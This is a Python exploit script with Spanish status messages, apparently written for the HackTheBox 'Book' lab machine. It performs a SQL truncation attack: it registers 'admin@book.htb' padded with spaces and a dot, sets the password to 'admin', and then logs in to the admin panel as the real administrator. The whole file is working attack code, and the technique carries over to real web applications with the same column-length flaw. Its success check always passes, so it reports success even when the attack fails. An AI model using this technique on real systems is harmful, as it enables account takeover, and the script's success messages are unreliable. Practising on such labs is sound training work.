import os
import time
from colorama import init,Fore,Style
import requests
import sys

print(f'''{Fore.MAGENTA}   _                            _                 _      _ _  _   ''')
time.sleep(0.1)
print(f'''{Fore.CYAN}  (_) __ _  __ _  __ _  ___  __| |_ __ ___  _   _| | ___/ | || |  ''')
time.sleep(0.1)
print(f'''{Fore.BLUE}  | |/ _` |/ _` |/ _` |/ _ \/ _` | '_ ` _ \| | | | |/ _ \ | || |_ ''')
time.sleep(0.1)
print(f'''{Fore.CYAN}  | | (_| | (_| | (_| |  __/ (_| | | | | | | |_| | |  __/ |__   _|''')
time.sleep(0.1)
print(f'''{Fore.MAGENTA} _/ |\__,_|\__, |\__, |\___|\__,_|_| |_| |_|\__,_|_|\___|_|  |_|  ''')
time.sleep(0.1)
print(f'''{Fore.CYAN}|__/       |___/ |___/                                            ''')
time.sleep(0.1)

print(f'\n{Fore.BLUE}JAGGEDMULE14 - BOOK HACKTHEBOX SQL TRUNCATION')


def conect(host):
    ping = os.system(f'ping -c 1 {host} >/dev/null 2>&1')
    if ping == 0:
        return True
    else:
        return False

if conect('10.10.10.176') == True:
    print(f'{Fore.GREEN}\n[+]Conexión exitosa')
    time.sleep(0.1)
    http = requests.get('http://10.10.10.176')
    if http.status_code == 200:
        print(f'{Fore.GREEN}[+]HTTP/{http.status_code} OK')
        time.sleep(0.1)
        dataCreds = {'name' : 'admin', 'email':'admin@book.htb      .', 'password':'admin'}
        print(f'{Fore.GREEN}[+]Creds admin@book.htb:admin')
        url = 'http://10.10.10.176/index.php'
        c = requests.session()
        c.post(url, data=dataCreds)
        
        d = requests.session()
        url2 = 'http://10.10.10.176/admin'
        dataAuth = {'email':'admin@book.htb', 'password':'admin'}
        r = d.post(url2, data=dataAuth)
        if '' in r.text:
            print(f'{Fore.GREEN}[+]SQL truncation exitoso')
            time.sleep(0.1)
            print(f'{Fore.GREEN}[+]Logueo como admin exitoso')
            time.sleep(0.1)
            print(f'{Fore.YELLOW}[!]Si la sesión te pone que no es válida después de un tiempo solo corre el script de nuevo')

        else:
            print(f'{Fore.RED}[-]Algo salió mal al loguearse')
            sys.exit(1)
    else:
        print(f'{Fore.RED}[-]HTTP/{Fore.RED}')
        sys.exit(1)
else:
    print(f'{Fore.RED}[-]Conexión fallida')
    time.sleep(0.1)
    print('[-]Verifica la conectividad con la máquina')
    time.sleep(0.1)
    print('[-]Intenta correr el script de nuevo')
    sys.exit(1)